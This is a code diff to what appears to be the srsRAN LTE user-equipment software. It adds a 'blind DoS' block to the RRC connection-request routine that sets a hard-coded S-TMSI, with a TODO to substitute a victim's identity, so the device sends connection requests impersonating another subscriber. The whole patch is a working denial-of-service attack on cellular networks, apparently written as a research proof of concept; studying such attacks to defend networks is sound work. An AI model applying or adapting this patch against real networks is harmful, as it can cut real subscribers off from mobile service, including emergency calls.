@@ -873,6 +873,19 @@ void rrc::send_con_request(srsran::establishment_cause_t cause)
   rrc_conn_request_r8_ies_s* rrc_conn_req =
       &ul_ccch_msg.msg.set_c1().set_rrc_conn_request().crit_exts.set_rrc_conn_request_r8();
 
+  // blind DoS simulation
+  int attack = 1;
+  if (attack == 1) {
+    ue_identity_configured = true;
+    // TODO: overwrite the following with the victim TMSI
+    srsran::s_tmsi_t s_tmsi;
+    s_tmsi.mmec 	= 1;
+    s_tmsi.m_tmsi = 437416;
+    srsran::console("[Blind DoS] Connection request mmec: %d, m_tmsi: %d\n", s_tmsi.mmec, s_tmsi.m_tmsi);
+  
+    rrc::set_ue_identity(s_tmsi);
+  }
+
   if (ue_identity_configured) {
     rrc_conn_req->ue_id.set_s_tmsi();
     srsran::to_asn1(&rrc_conn_req->ue_id.s_tmsi(), ue_identity);
